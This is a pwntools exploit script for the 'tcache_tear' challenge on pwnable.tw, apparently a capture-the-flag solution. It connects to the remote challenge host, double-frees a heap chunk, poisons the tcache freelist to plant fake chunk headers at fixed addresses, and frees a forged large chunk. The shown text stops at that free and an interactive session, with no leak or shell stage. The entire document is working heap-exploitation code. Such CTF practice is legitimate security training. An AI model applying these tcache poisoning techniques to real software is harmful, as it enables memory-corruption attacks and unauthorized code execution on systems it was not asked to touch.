from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = remote("chall.pwnable.tw", 10207)
# p = process("./tcache_tear")
e = ELF("./tcache_tear")
libc = ELF("./libc.so")
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
# gdb.attach(p)


def add(size, data):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Size:")
    p.sendline(str(size).encode())
    p.recvuntil(b"Data:")
    p.sendline(data)


def free():
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")


p.recvuntil(b"Name:")
p.sendline(b"xxx")

add(0x70, b"AAAA")

free()
free()

addr = 0x602550
add(0x70, p64(addr))
add(0x70, p64(addr))
val = p64(0) + p64(0x21) + p64(0) + p64(0) + p64(0) + p64(0x21)
add(0x70, val)

addr = 0x602050
add(0x60, p64(addr))
addr = 0x602050
add(0x60, p64(addr))
val = p64(0) + p64(0x501) + p64(0) + p64(0) + p64(0) * 3 + p64(0x602060)
add(0x60, val)

free()

p.interactive()
